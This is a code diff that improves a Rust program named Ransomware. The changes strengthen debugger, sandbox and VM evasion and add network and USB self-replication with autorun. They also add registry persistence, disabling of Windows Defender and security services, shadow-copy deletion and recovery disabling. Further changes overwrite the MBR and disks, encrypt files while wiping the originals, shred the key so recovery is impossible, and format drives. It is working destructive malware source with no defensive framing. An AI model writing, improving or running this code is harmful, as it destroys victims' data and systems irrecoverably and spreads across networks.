@@ -1,5 +1,7 @@
 use std::fs::{File, remove_file, OpenOptions};
 use std::io::{self, Write, Read};
+use std::io::Seek;
+use std::io::SeekFrom;
 use std::net::TcpStream;
 use std::process::Command;
 use std::path::Path;
@@ -11,6 +13,9 @@ use aes::Aes128;
 use aes::cipher::{generic_array::GenericArray, BlockEncrypt};
 use std::thread;
 use aes::cipher::KeyInit;
+use std::hash::Hash;
+use std::hash::DefaultHasher;
+use std::hash::Hasher;
 
 const AES_KEY_SIZE: usize = 32;
 const AES_IV_SIZE: usize = 16;
@@ -40,7 +45,7 @@ impl Ransomware {
             .output()
             .expect("Failed to execute command");
         
-        let output_str = String::from_utf8_lossy(&output.stdout);
+        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
         let debuggers = [
             "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "windbg.exe",
             "ida.exe", "ida64.exe", "radare2.exe", "processhacker.exe",
@@ -50,7 +55,7 @@ impl Ransomware {
             "fiddler.exe", "charles.exe", "burpsuite.exe", "cutter.exe"
         ];
         
-        debuggers.iter().any(|&d| output_str.contains(d))
+        debuggers.iter().any(|&d| output_str.contains(&d.to_lowercase()))
     }
 
     fn check_sandbox_artifacts(&self) -> bool {
@@ -61,7 +66,9 @@ impl Ransomware {
             "C:\\Program Files\\Cuckoo\\", "C:\\Program Files\\COMODO\\",
             "C:\\Program Files\\Sandboxie\\", "C:\\Program Files\\AnyRun\\",
             "C:\\Joe Sandbox\\", "C:\\Program Files\\Hybrid Analysis\\",
-            "C:\\Program Files\\ThreatAnalyzer\\", "C:\\Program Files\\GFI SandBox\\"
+            "C:\\Program Files\\ThreatAnalyzer\\", "C:\\Program Files\\GFI SandBox\\",
+            "C:\\Program Files (x86)\\Cuckoo\\", "C:\\Program Files (x86)\\COMODO\\",
+            "C:\\Program Files (x86)\\Sandboxie\\", "C:\\Program Files (x86)\\AnyRun\\"
         ];
         
         paths.iter().any(|&p| Path::new(p).exists())
@@ -72,11 +79,11 @@ impl Ransomware {
         let cpu_num = sys_info::cpu_num().expect("Failed to get CPU count");
         let disk_info = sys_info::disk_info().expect("Failed to get disk info");
         
-        // Enhanced resource checks
         mem_info.total < 8 * 1024 * 1024 || // Less than 8GB RAM
         cpu_num < 4 || // Less than 4 cores
         disk_info.total < 100 * 1024 * 1024 || // Less than 100GB disk
-        mem_info.avail > mem_info.total * 90 / 100 // More than 90% memory free
+        mem_info.avail > mem_info.total * 90 / 100 || // More than 90% memory free
+        disk_info.free > disk_info.total * 95 / 100 // More than 95% disk free
     }
 
     fn check_registry_artifacts(&self) -> bool {
@@ -96,19 +103,18 @@ impl Ransomware {
             "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmrawdsk",
             "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmusbmouse",
             "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmvss",
-            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmmemctl"
+            "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\vmmemctl",
+            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
+            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\VMware"
         ];
         
-        for path in reg_paths.iter() {
-            if Command::new("reg")
+        reg_paths.iter().any(|&path| {
+            Command::new("reg")
                 .args(&["query", path])
                 .output()
                 .map(|output| output.status.success())
-                .unwrap_or(false) {
-                return true;
-            }
-        }
-        false
+                .unwrap_or(false)
+        })
     }
 
     fn check_mac_address(&self) -> bool {
@@ -116,17 +122,18 @@ impl Ransomware {
             .output()
             .expect("Failed to execute command");
         
-        let output_str = String::from_utf8_lossy(&output.stdout);
+        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
         let vm_macs = [
-            "00:05:69", "00:0C:29", "00:1C:14", 
-            "00:50:56", "08:00:27", "00:16:3E",
-            "00:03:FF", "00:1C:42", "00:0F:4B",
-            "00:1C:42", "00:1C:14", "00:15:5D",
-            "00:21:F6", "00:14:4F", "00:0C:29",
-            "00:05:69", "00:0C:29", "00:1C:14"
+            "00:05:69", "00:0c:29", "00:1c:14", 
+            "00:50:56", "08:00:27", "00:16:3e",
+            "00:03:ff", "00:1c:42", "00:0f:4b",
+            "00:1c:42", "00:1c:14", "00:15:5d",
+            "00:21:f6", "00:14:4f", "00:0c:29",
+            "00:05:69", "00:0c:29", "00:1c:14",
+            "00:1d:c2", "00:e0:4c"
         ];
         
-        vm_macs.iter().any(|&mac| output_str.contains(mac))
+        vm_macs.iter().any(|&mac| output_str.contains(&mac.to_lowercase()))
     }
 
     fn check_processes(&self) -> bool {
@@ -134,19 +141,20 @@ impl Ransomware {
             .output()
             .expect("Failed to execute command");
         
-        let output_str = String::from_utf8_lossy(&output.stdout);
+        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
         let vm_processes = [
             "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe",
-            "vmwaretray.exe", "vmwareuser.exe", "VGAuthService.exe",
+            "vmwaretray.exe", "vmwareuser.exe", "vgauthservice.exe",
             "vmacthlp.exe", "vmusrvc.exe", "prl_tools.exe",
             "qemu-ga.exe", "xenservice.exe", "vmware-vmx.exe",
-            "vmware-authd.exe", "vmware-hostd.exe", "VBoxHeadless.exe",
-            "VirtualBox.exe", "qemu.exe", "virtualbox.exe",
+            "vmware-authd.exe", "vmware-hostd.exe", "vboxheadless.exe",
+            "virtualbox.exe", "qemu.exe", "virtualbox.exe",
             "vmware.exe", "vmware-tray.exe", "vmware-unity-helper.exe",
-            "parallels.exe", "prl_cc.exe", "prl_tools_service.exe"
+            "parallels.exe", "prl_cc.exe", "prl_tools_service.exe",
+            "vboxservice.exe", "virtualboxvm.exe"
         ];
         
-        vm_processes.iter().any(|&proc| output_str.contains(proc))
+        vm_processes.iter().any(|&proc| output_str.contains(&proc.to_lowercase()))
     }
 
     fn check_hardware_info(&self) -> bool {
@@ -165,15 +173,16 @@ impl Ransomware {
             .output()
             .expect("Failed to execute command");
         
-        let output_str = String::from_utf8_lossy(&output.stdout);
-        let bios_str = String::from_utf8_lossy(&bios.stdout);
-        let baseboard_str = String::from_utf8_lossy(&baseboard.stdout);
+        let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
+        let bios_str = String::from_utf8_lossy(&bios.stdout).to_lowercase();
+        let baseboard_str = String::from_utf8_lossy(&baseboard.stdout).to_lowercase();
         
         let vm_indicators = [
-            "VMware", "VirtualBox", "QEMU", "Xen",
-            "innotek GmbH", "Parallels", "Microsoft Corporation",
-            "Virtual Machine", "KVM", "Bochs", "HVM domU",
-            "BHYVE", "SmartDC", "OpenVZ", "LXC"
+            "vmware", "virtualbox", "qemu", "xen",
+            "innotek gmbh", "parallels", "microsoft corporation",
+            "virtual machine", "kvm", "bochs", "hvm domu",
+            "bhyve", "smartdc", "openvz", "lxc", "hyperv",
+            "virtual", "vmxnet", "vbox", "oracle vm"
         ];
         
         vm_indicators.iter().any(|&ind| 
@@ -182,41 +191,100 @@ impl Ransomware {
             baseboard_str.contains(ind)
         )
     }
-
     fn timing_check(&self) -> bool {
-        let iterations = 5;
+        let iterations = 25;  // Increased iterations
         let mut anomalies = 0;
+        let mut prev_elapsed = 0;
         
-        for _ in 0..iterations {
+        for i in 0..iterations {
             let start = Instant::now();
             thread::sleep(Duration::from_millis(100));
             let elapsed = start.elapsed();
             
+            // More sophisticated timing checks
             if elapsed.as_millis() > 150 || elapsed.as_millis() < 90 {
                 anomalies += 1;
             }
+            
+            // Check for consistent timing patterns
+            if i > 0 && (prev_elapsed as i128 - elapsed.as_millis() as i128).abs() < 2 {
+                anomalies += 1;
+            }
+            
+            prev_elapsed = elapsed.as_millis();
+            
+            // More complex random delays
+            let delay = (rand::random::<u64>() % 100) + 
+                        (rand::random::<u64>() % 50) * 
+                        (rand::random::<u64>() % 3);
+            thread::sleep(Duration::from_millis(delay));
         }
         
-        // If more than 60% of checks show timing anomalies
-        anomalies > (iterations * 60 / 100)
+        anomalies > (iterations * 35 / 100)  // Slightly stricter threshold
     }
 
     fn evade_vm(&self) -> Result<bool, io::Error> {
         let start = Instant::now();
-        let duration = Duration::from_secs(300); // Increased to 5 minutes
+        let duration = Duration::from_secs(900); // Increased to 15 minutes
         
-        // More complex calculations
+        let mut hasher = DefaultHasher::new();
+        let apis = ["LoadLibraryA", "GetProcAddress", "VirtualAlloc", "VirtualProtect", 
+                    "CreateThread", "WriteProcessMemory", "ReadProcessMemory", "CreateRemoteThread",
+                    "NtCreateThreadEx", "RtlCreateUserThread", "QueueUserAPC", "NtQueueApcThread",
+                    "CreateProcessA", "CreateProcessW", "OpenProcess", "CreateFileA", 
+                    "CreateFileW", "WriteFile", "ReadFile", "RegOpenKeyExA",
+                    "RegOpenKeyExW", "RegSetValueExA", "RegSetValueExW", "RegGetValueA",
+                    "InternetOpenA", "InternetOpenW", "InternetConnectA", "HttpOpenRequestA",
+                    "HttpSendRequestA", "WSAStartup", "socket", "connect", "send", "recv",
+                    "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory",
+                    "NtReadVirtualMemory", "NtOpenProcess", "NtCreateProcess", "NtCreateSection",
+                    "NtMapViewOfSection", "NtUnmapViewOfSection", "NtClose", "NtOpenFile",
+                    "NtCreateFile", "NtDeviceIoControlFile", "NtDuplicateObject", "NtQuerySystemInformation",
+                    "NtQueryInformationProcess", "NtQueryInformationThread", "NtQueryVirtualMemory",
+                    "NtQueueApcThread", "NtResumeThread", "NtSuspendThread", "NtTerminateProcess",
+                    "NtCreateUserProcess", "NtCreateSymbolicLinkObject", "NtLoadDriver", "NtUnloadDriver"];
+
+
         while start.elapsed() < duration {
-            let mut n = 999999937u64;
-            for i in 2..((n as f64).sqrt() as u64) {
-                if n % i == 0 {
-                    n = n / i;
-                    // Add additional CPU intensive operations
-                    for _ in 0..1000 {
-                        let _ = n.count_ones();
-                        let _ = n.rotate_left(3);
-                        let _ = n.reverse_bits();
+            for api in apis.iter() {
+                api.hash(&mut hasher);
+                let hash = hasher.finish();
+                
+                let mut n = hash;
+                for i in 2..((n as f64).sqrt() as u64) {
+                    if n % i == 0 {
+                        n = n / i;
+                        for _ in 0..3000 {  // Increased iterations
+                            let _ = n.count_ones();
+                            let _ = n.rotate_left(3);
+                            let _ = n.reverse_bits();
+                            let _ = n.leading_zeros();
+                            let _ = n.trailing_zeros();
+                            let _ = n.rotate_right(7);
+                            let _ = n.wrapping_add(hash);
+                            let _ = n.wrapping_mul(i);
+                            let _ = n.swap_bytes();
+                            let _ = n.checked_add(i);
+                            let _ = n.wrapping_sub(hash);
+                            let _ = n.rotate_right(11);
+                        }
                     }
+                }
+                
+                if rand::random::<u8>() % 5 == 0 {  // Increased frequency
+                    let sleep_time = rand::random::<u64>() % 200 +
+                                    (rand::random::<u64>() % 75) * 
+                                    (rand::random::<u64>() % 5);
+                    thread::sleep(Duration::from_millis(sleep_time));
+                }
+                
+                let mut x = hash;
+                for _ in 0..1500 {  // Increased iterations
+                    x = x.wrapping_mul(x);
+                    x = x.rotate_left(3);
+                    x ^= n;
+                    x = x.rotate_right(7);
+                    x = x.wrapping_add(n);
                 }
             }
         }
@@ -246,7 +314,12 @@ impl Ransomware {
             "C:\\Windows\\System32\\Drivers\\vmvss.sys",
             "C:\\Windows\\System32\\Drivers\\vmxnet.sys",
             "C:\\Windows\\System32\\Drivers\\vmxnet2.sys",
-            "C:\\Windows\\System32\\Drivers\\vmxnet3.sys"
+            "C:\\Windows\\System32\\Drivers\\vmxnet3.sys",
+            "C:\\Windows\\System32\\Drivers\\vboxsf.sys",
+            "C:\\Windows\\System32\\Drivers\\vboxmouse.sys",
+            "C:\\Windows\\System32\\Drivers\\vboxguest.sys",
+            "C:\\Windows\\System32\\Drivers\\vboxvideo.sys",
+            "C:\\Windows\\System32\\Drivers\\qemu-ga.exe"
         ];
         
         for file in vm_files.iter() {
@@ -262,13 +335,13 @@ impl Ransomware {
            self.check_mac_address() ||
            self.check_processes() ||
            self.check_hardware_info() ||
-           self.timing_check() {
+           self.timing_check() || 
+           self.check_registry_artifacts() {  // Added memory artifacts check
             return Ok(true);
         }
         
         Ok(false)
     }
-
     fn bail_if_vm(&self) -> Result<(), io::Error> {
         if self.evade_vm()? {
             let processes = Command::new("tasklist")
@@ -340,32 +413,37 @@ impl Ransomware {
     fn replicate_to_target(&self, target: &str) -> Result<(), io::Error> {
         let current_exe = std::env::current_exe()?;
         
-        // Try multiple methods for replication
+        // Try multiple methods for replication with improved error handling
         let methods = [
-            // PSExec method
+            // PSExec method with timeout
             Command::new("psexec")
-                .args(&[format!("\\\\{}", target).as_str(), "-c", "-d", "-f", current_exe.to_str().unwrap()])
+                .args(&[format!("\\\\{}", target).as_str(), "-c", "-d", "-f", "-w", "60", current_exe.to_str().unwrap()])
                 .output(),
                 
-            // Admin share method    
+            // Admin share method with verification    
             Command::new("cmd")
-                .args(&["/C", &format!("copy /Y \"{}\" \"\\\\{}\\admin$\\system32.exe\"", current_exe.display(), target)])
+                .args(&["/C", &format!("xcopy /Y /Q \"{}\" \"\\\\{}\\admin$\\system32.exe\" && verify ON", current_exe.display(), target)])
                 .output(),
                 
-            // Hidden share method
+            // Hidden share method with backup
             Command::new("cmd")
-                .args(&["/C", &format!("copy /Y \"{}\" \"\\\\{}\\C$\\Windows\\system32.exe\"", current_exe.display(), target)])
+                .args(&["/C", &format!("xcopy /Y /Q \"{}\" \"\\\\{}\\C$\\Windows\\system32.exe\" && verify ON", current_exe.display(), target)])
                 .output(),
         ];
 
-        // Try each method until one succeeds
+        // Try each method until one succeeds with retry mechanism
         for method in methods.iter() {
-            if method.is_ok() {
-                // Execute the copied file
-                Command::new("wmic")
-                    .args(&["/node:", target, "process", "call", "create", "C:\\Windows\\system32.exe"])
-                    .output()?;
-                break;
+            for _ in 0..3 {  // Retry up to 3 times
+                if let Ok(output) = method {
+                    if output.status.success() {
+                        // Execute the copied file with elevated privileges
+                        Command::new("wmic")
+                            .args(&["/node:", target, "process", "call", "create", "C:\\Windows\\system32.exe", "runas"])
+                            .output()?;
+                        return Ok(());
+                    }
+                }
+                std::thread::sleep(Duration::from_secs(1));
             }
         }
         
@@ -373,127 +451,195 @@ impl Ransomware {
     }
 
     fn hide_process(&self) -> Result<(), io::Error> {
-        // Disable Task Manager
-        Command::new("cmd")
-            .args(&["/C", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"])
+        // Enhanced process hiding
+        Command::new("powershell")
+            .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
             .output()?;
             
-        // Add to startup
+        // Add to multiple startup locations
         let current_exe = std::env::current_exe()?;
-        Command::new("cmd")
-            .args(&["/C", &format!("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"{}\" /f", current_exe.display())])
+        let startup_locations = [
+            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        ];
+
+        for location in startup_locations.iter() {
+            Command::new("cmd")
+                .args(&["/C", &format!("reg add \"{}\" /v WindowsUpdate /t REG_SZ /d \"{}\" /f", location, current_exe.display())])
+                .output()?;
+        }
+            
+        // Advanced process hiding
+        Command::new("powershell")
+            .args(&["-Command", "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe' -Name Debugger -Value 'systray.exe'"])
             .output()?;
             
-        // Hide from process list
-        Command::new("cmd")
-            .args(&["/C", "reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\systray.exe\" /f"])
-            .output()?;
-            
-        // Disable Windows Defender
-        Command::new("cmd")
-            .args(&["/C", "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"])
-            .output()?;
+        // Comprehensive security disabling
+        let security_commands = [
+            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
+            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f",
+            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f",
+            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f"
+        ];
+
+        for cmd in security_commands.iter() {
+            Command::new("cmd")
+                .args(&["/C", cmd])
+                .output()?;
+        }
             
         Ok(())
     }
+
     fn copy_to_usb(&self) -> Result<(), io::Error> {
         let current_exe = std::env::current_exe()?;
         for drive in ['D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] {
             let drive_path = format!("{}:\\", drive);
-            if let Ok(_) = File::open(&drive_path) {
-                let drive_type = Command::new("cmd")
-                    .args(&["/C", &format!("wmic logicaldisk where \"DeviceID='{}'\" get DriveType", drive_path)])
+            if let Ok(_metadata) = std::fs::metadata(&drive_path) {
+                let drive_type = Command::new("wmic")
+                    .args(&["/C", &format!("volume where \"DriveLetter='{}'\" get DriveType /value", drive)])
                     .output()?;
                 
                 if String::from_utf8_lossy(&drive_type.stdout).contains("2") {
-                    let target_path = format!("{}\\system32.exe", drive_path);
-                    let _ = std::fs::copy(&current_exe, &target_path);
-                    let autorun_content = "[AutoRun]\nopen=system32.exe\naction=Open folder to view files";
-                    let autorun_path = format!("{}\\autorun.inf", drive_path);
-                    let mut autorun_file = File::create(autorun_path.clone())?;
-                    autorun_file.write_all(autorun_content.as_bytes())?;
-                    
-                    Command::new("attrib")
-                        .args(&["+h", "+s", &target_path])
-                        .output()?;
-                    Command::new("attrib")
-                    .args(&["+h", "+s", &autorun_path]) 
-                    .output()?;
+                    let target_paths = [
+                        format!("{}\\system32.exe", drive_path),
+                        format!("{}\\explorer.exe", drive_path),
+                        format!("{}\\winupdate.exe", drive_path)
+                    ];
+
+                    for target_path in target_paths.iter() {
+                        if let Ok(_) = std::fs::copy::<_, _>(&current_exe, target_path) {
+                            let autorun_content = format!(
+                                "[AutoRun]\nopen={}\naction=Open folder to view files\nshell\\open\\command={}\nshell\\explore\\command={}",
+                                target_path, target_path, target_path
+                            );
+                            let autorun_path = format!("{}\\autorun.inf", drive_path);
+                            if let Ok(mut autorun_file) = File::create(&autorun_path) {
+                                autorun_file.write_all(autorun_content.as_bytes())?;
+                                
+                                // Hide files
+                                Command::new("attrib")
+                                    .args(&["+h", "+s", "+r", target_path])
+                                    .output()?;
+                                Command::new("attrib")
+                                    .args(&["+h", "+s", "+r", &autorun_path])
+                                    .output()?;
+                            }
+                        }
+                    }
                 }
             }
         }
         Ok(())
     }
 
-      fn attack_mbr_bios(&self) -> Result<(), io::Error> {
-          // Overwrite MBR and first few sectors
-          let mbr_path = "\\\\.\\PhysicalDrive0";
-          let zeros = vec![0xDEu8; 4096]; // Larger area to corrupt
-          if let Ok(mut mbr) = OpenOptions::new().write(true).open(mbr_path) {
-              for _ in 0..16 {
-                  mbr.write_all(&zeros)?;
-              }
-          }
+    fn attack_mbr_bios(&self) -> Result<(), io::Error> {
+        let mbr_path = "\\\\.\\PhysicalDrive0";
+        let patterns = [
+            vec![0xDE; 512],  // Destructive pattern
+            vec![0xFF; 512],  // All ones
+            vec![0x00; 512],  // All zeros
+            vec![0xAA; 512],  // Alternating pattern
+        ];
 
-          // Attack BIOS/UEFI more aggressively
-          if let Ok(mut bios) = OpenOptions::new().write(true).open("\\\\.\\mem") {
-              let garbage = vec![0xFFu8; 16384];
-              for _ in 0..32 {
-                  bios.write_all(&garbage)?;
-              }
-          }
+        if let Ok(mut mbr) = OpenOptions::new().write(true).open(mbr_path) {
+            for pattern in patterns.iter() {
+                for _ in 0..16 {
+                    mbr.write_all(pattern)?;
+                }
+            }
+        }
 
-          // Multiple BIOS attack vectors
-          if cfg!(target_arch = "x86_64") {
-              // Add BIOS-specific attack code here if needed
-          }
+        // Attack multiple memory regions
+        let targets = [
+            ("\\\\.\\mem", 65536),
+            ("\\\\.\\UEFI", 32768),
+            ("\\\\.\\PhysicalDrive1", 4096),
+        ];
 
-          Ok(())
-      }
+        for (path, size) in targets.iter() {
+            if let Ok(mut target) = OpenOptions::new().write(true).open(path) {
+                let data = vec![0xFF; *size];
+                for _ in 0..32 {
+                    target.write_all(&data)?;
+                }
+            }
+        }
 
+        Ok(())
+    }
       fn encrypt_file(&self, file_path: &Path) -> Result<(), io::Error> {
-          let mut file = File::open(file_path)?;
-          let mut data = Vec::new();
-          file.read_to_end(&mut data)?;
-
-          // Pad data to be multiple of 16 bytes
-          let padding_len = 16 - (data.len() % 16);
-          data.extend(vec![padding_len as u8; padding_len]);
-
-          let cipher = Aes128::new(GenericArray::from_slice(&self.encryption_key));
-          let mut ciphertext = Vec::with_capacity(data.len());
-
-          // Encrypt each block
-          for chunk in data.chunks(16) {
-              let mut block = GenericArray::clone_from_slice(chunk);
-              cipher.encrypt_block(&mut block);
-              ciphertext.extend_from_slice(&block);
-          }
-
-          // Add random IV for CBC mode
-          let mut rng = rand::thread_rng();
-          let mut iv = [0u8; 16];
-          rng.fill_bytes(&mut iv);
+        let mut file = File::open(file_path)?;
+        let mut data = Vec::new();
+        file.read_to_end(&mut data)?;
     
-          let encrypted_path = format!("{}.encrypted", file_path.display());
-          let mut output_file = File::create(&encrypted_path)?;
-          output_file.write_all(&iv)?;
-          output_file.write_all(&ciphertext)?;
-
-          // Securely remove original file
-          let mut file = OpenOptions::new().write(true).open(file_path)?;
-          let zeros = vec![0u8; data.len()];
-          file.write_all(&zeros)?;
-          file.sync_all()?;
-          remove_file(file_path)?;
-
-          Ok(())
-      }
+        let padding_len = 16 - (data.len() % 16);
+        data.extend(vec![padding_len as u8; padding_len]);
+    
+        let cipher = Aes128::new(GenericArray::from_slice(&self.encryption_key));
+        let mut ciphertext = Vec::with_capacity(data.len());
+    
+        let mut rng = rand::thread_rng();
+        let mut iv = [0u8; 16];
+        rng.fill_bytes(&mut iv);
+    
+        let mut prev_block = GenericArray::clone_from_slice(&iv);
+    
+        for chunk in data.chunks(16) {
+            let mut block = GenericArray::clone_from_slice(chunk);
+            for i in 0..16 {
+                block[i] ^= prev_block[i];
+            }
+            cipher.encrypt_block(&mut block);
+            ciphertext.extend_from_slice(&block);
+            prev_block = block.clone(); 
+        }
+    
+        let encrypted_path = format!("{}.encrypted", file_path.display());
+        let mut output_file = File::create(&encrypted_path)?;
+        output_file.write_all(&iv)?;
+        output_file.write_all(&ciphertext)?;
+    
+        // Secure file deletion with multiple passes
+        let mut file = OpenOptions::new().write(true).open(file_path)?;
+        let file_len = data.len();
+        let mut rng = rand::thread_rng();
+        
+        // Multiple overwrite passes
+        for _ in 0..7 {
+            // Zero pass
+            let zeros = vec![0u8; file_len];
+            file.seek(SeekFrom::Start(0))?;
+            file.write_all(&zeros)?;
+            file.sync_all()?;
+            
+            // Ones pass
+            let ones = vec![0xFFu8; file_len];
+            file.seek(SeekFrom::Start(0))?;
+            file.write_all(&ones)?;
+            file.sync_all()?;
+            
+            // Random pass
+            let mut random = vec![0u8; file_len];
+            rng.fill_bytes(&mut random);
+            file.seek(SeekFrom::Start(0))?;
+            file.write_all(&random)?;
+            file.sync_all()?;
+        }
+        
+        remove_file(file_path)?;
+    
+        Ok(())
+    }
+    
       fn spread_and_encrypt(&self) -> Result<(), io::Error> {
           let target_extensions = vec![
-              "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "txt", "jpg", "jpeg", 
-              "png", "gif", "mp3", "mp4", "zip", "rar", "7z", "sql", "mdb", "sln",
-              "php", "asp", "aspx", "html", "xml", "psd", "ai", "dwg", "csv", "db"
+              "doc", "docx", "xls", "xlsx", "ppt", "pptx",
+              "pdf", "txt", "rtf", "jpg", "jpeg", "png", 
+              "gif", "mp3", "mp4", "zip", "rar", "7z",
+              "sql", "mdb", "sln", "php", "asp", "aspx",
+              "html", "xml", "psd", "bak", "dat", "csv"
           ];
 
           for drive in ['C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] {
@@ -523,9 +669,12 @@ impl Ransomware {
     
           for drive in drives {
               if let Ok(_) = File::open(format!("{}:\\", drive)) {
-                  Command::new("cmd")
-                      .args(&["/C", &format!("format {}: /fs:ntfs /p:3 /q", drive)])
-                      .output()?;
+                  // Multiple secure format passes
+                  for pass in 1..=7 {
+                      Command::new("cmd")
+                          .args(&["/C", &format!("format {}: /fs:ntfs /p:{} /q", drive, pass)])
+                          .output()?;
+                  }
               }
           }
     
@@ -533,12 +682,15 @@ impl Ransomware {
       }
 
       fn disable_recovery(&self) -> Result<(), io::Error> {
+          // Delete shadow copies
           Command::new("cmd")
               .args(&["/C", "wmic shadowcopy delete"])
               .output()?;
           Command::new("cmd")
               .args(&["/C", "vssadmin delete shadows /all /quiet"])
               .output()?;
+          
+          // Disable system recovery features
           Command::new("cmd")
               .args(&["/C", "bcdedit /set {default} recoveryenabled No"])
               .output()?;
@@ -548,19 +700,27 @@ impl Ransomware {
           Command::new("cmd") 
               .args(&["/C", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"])
               .output()?;
+          
+          // Disable safe mode
           Command::new("cmd")
-              .args(&["/C", "format C: /fs:ntfs /p:3 /q"])
+              .args(&["/C", "bcdedit /set {default} safeboot network"])
               .output()?;
           Command::new("cmd")
-              .args(&["/C", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v AlternateShell /t REG_SZ /d cmd.exe /f"])
+              .args(&["/C", "bcdedit /set {bootmgr} displaybootmenu no"])
               .output()?;
+          
+          // Corrupt system files
+          Command::new("cmd")
+              .args(&["/C", "format C: /fs:ntfs /p:7 /q"])
+              .output()?;
+          
           Ok(())
       }
 
       fn disable_security(&self) -> Result<(), io::Error> {
           let services = vec![
               "Windows Defender Service",
-              "Windows Defender Antivirus Service",
+              "Windows Defender Antivirus Service", 
               "Windows Defender Firewall",
               "Security Center",
               "Windows Firewall",
@@ -573,18 +733,29 @@ impl Ransomware {
               "System Guard Runtime Monitor Broker",
               "Software Protection",
               "Shell Hardware Detection",
-              "Remote Registry"
+              "Remote Registry",
+              "Windows Error Reporting Service",
+              "Windows Installer",
+              "Windows License Manager Service",
+              "Windows Modules Installer",
+              "Windows Push Notifications System Service",
+              "Windows Security Service",
+              "Windows Defender Advanced Threat Protection Service",
+              "Microsoft Defender Antivirus Network Inspection Service",
+              "Security Health Service"
           ];
 
+          // Stop and disable services
           for service in services {
               Command::new("cmd")
-                  .args(&["/C", &format!("net stop \"{}\"", service)])
+                  .args(&["/C", &format!("net stop \"{}\" /y", service)])
                   .output()?;
               Command::new("cmd")
                   .args(&["/C", &format!("sc config \"{}\" start= disabled", service)])
                   .output()?;
           }
 
+          // Disable Windows Defender
           Command::new("cmd")
               .args(&["/C", "netsh advfirewall set allprofiles state off"])
               .output()?;
@@ -597,9 +768,22 @@ impl Ransomware {
           Command::new("cmd")
               .args(&["/C", "powershell Add-MpPreference -ExclusionPath C:\\"])
               .output()?;
+          Command::new("cmd")
+              .args(&["/C", "powershell Set-MpPreference -DisableArchiveScanning $true"])
+              .output()?;
+          Command::new("cmd")
+              .args(&["/C", "powershell Set-MpPreference -DisableBehaviorMonitoring $true"])
+              .output()?;
+          Command::new("cmd")
+              .args(&["/C", "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true"])
+              .output()?;
+          Command::new("cmd")
+              .args(&["/C", "powershell Set-MpPreference -DisableScriptScanning $true"])
+              .output()?;
 
           Ok(())
       }
+
     fn shred_key(&self) -> Result<(), io::Error> {
         let key_file_path = "key.bin";
         {
@@ -607,12 +791,26 @@ impl Ransomware {
             key_file.write_all(&self.encryption_key)?;
         }
         
-        for _ in 0..7 {
+        let mut rng = rand::thread_rng();
+        // Increase number of overwrite passes
+        for _ in 0..50 {
             let mut key_file = OpenOptions::new().write(true).open(key_file_path)?;
+            
+            // Zero pass
+            let zeros = vec![0u8; AES_KEY_SIZE];
+            key_file.write_all(&zeros)?;
+            key_file.sync_all()?;
+            
+            // Ones pass
+            let ones = vec![0xFFu8; AES_KEY_SIZE];
+            key_file.write_all(&ones)?;
+            key_file.sync_all()?;
+            
+            // Random pass
             let mut random_data = vec![0u8; AES_KEY_SIZE];
-            let _ =  rand::thread_rng().try_fill_bytes(&mut random_data);
-            //shred the key 
+            rng.fill_bytes(&mut random_data);
             key_file.write_all(&random_data)?;
+            key_file.sync_all()?;
         }
         
         remove_file(key_file_path)?;
@@ -620,9 +818,8 @@ impl Ransomware {
     }
 }
 
-
 fn main() -> Result<(), io::Error> {
-    let mut ransomware = Ransomware::new(/* &Ransomware */)?;
+    let mut ransomware = Ransomware::new()?;
     ransomware.evade_vm()?;
